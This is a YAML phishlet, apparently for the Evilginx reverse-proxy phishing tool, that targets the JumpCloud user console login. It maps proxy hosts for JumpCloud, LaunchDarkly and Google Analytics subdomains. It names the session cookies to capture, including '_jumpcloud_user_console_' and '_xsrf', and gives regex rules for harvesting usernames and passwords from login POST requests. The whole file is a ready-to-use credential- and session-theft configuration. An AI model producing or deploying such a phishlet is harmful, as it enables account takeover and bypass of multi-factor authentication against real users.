name: jumpcloud_user_portal
author: @rtlphishletgen
yaml_content:
name: 'jumpcloud_user_portal'
author: '@rtlphishletgen'
min_ver: '3.2.0'
proxy_hosts:
  - {phish_sub: 'console', orig_sub: 'console', domain: 'jumpcloud.com', session: true, is_landing: true}
  - {phish_sub: 'status', orig_sub: 'status', domain: 'jumpcloud.com', session: true, is_landing: false}
  - {phish_sub: 'cdn03', orig_sub: 'cdn03', domain: 'jumpcloud.com', session: true, is_landing: false}
  - {phish_sub: 'launchdarkly', orig_sub: 'app', domain: 'launchdarkly.com', session: false, is_landing: false}
  - {phish_sub: 'google-analytics', orig_sub: 'www', domain: 'google-analytics.com', session: false, is_landing: false}
sub_filters:
  - {triggers_on: 'console.jumpcloud.com', orig_sub: 'status', domain: 'jumpcloud.com', search: 'status.jumpcloud.com', 
      replace: 'status.jumpcloud.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
  - {triggers_on: 'console.jumpcloud.com', orig_sub: 'status', domain: 'jumpcloud.com', search: 'status%2Ejumpcloud%2Ecom',
    replace: 'status%2Ejumpcloud%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
  - {triggers_on: 'console.jumpcloud.com', orig_sub: 'cdn03', domain: 'jumpcloud.com', search: 'cdn03.jumpcloud.com', 
      replace: 'cdn03.jumpcloud.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
  - {triggers_on: 'console.jumpcloud.com', orig_sub: 'cdn03', domain: 'jumpcloud.com', search: 'cdn03%2Ejumpcloud%2Ecom',
    replace: 'cdn03%2Ejumpcloud%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
  - {triggers_on: 'console.jumpcloud.com', orig_sub: 'app', domain: 'launchdarkly.com', search: 'app.launchdarkly.com', 
      replace: 'app.launchdarkly.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
  - {triggers_on: 'console.jumpcloud.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'www.google-analytics.com',
    replace: 'www.google-analytics.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
auth_tokens:
  - domain: '.jumpcloud.com'
    keys:
      - '_jumpcloud_user_console_'
  - domain: '.console.jumpcloud.com'
    keys:
      - '_xsrf'
      - 'jc_prevLoginType'
      - '_dd_s'
      - 'timezone_offset_minutes'
credentials:
  username:
    key: '(email|username|login|user|loginfmt|UserName|identifier|account|userid)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(password|passwd|pwd|Passwd|Password|pass|pin|passcode)'
    search: '(.*)'
    type: 'post'
auth_urls:
  - '/.*'
login:
  domain: 'console.jumpcloud.com'
  path: '/login'
force_post:
  - path: '/login'
    search:
      - {key: '(email|username|login|user|loginfmt|UserName|identifier|account|userid)', search: '(.*)'}
      - {key: '(password|passwd|pwd|Passwd|Password|pass|pin|passcode)', search: '(.*)'}
    type: 'post'
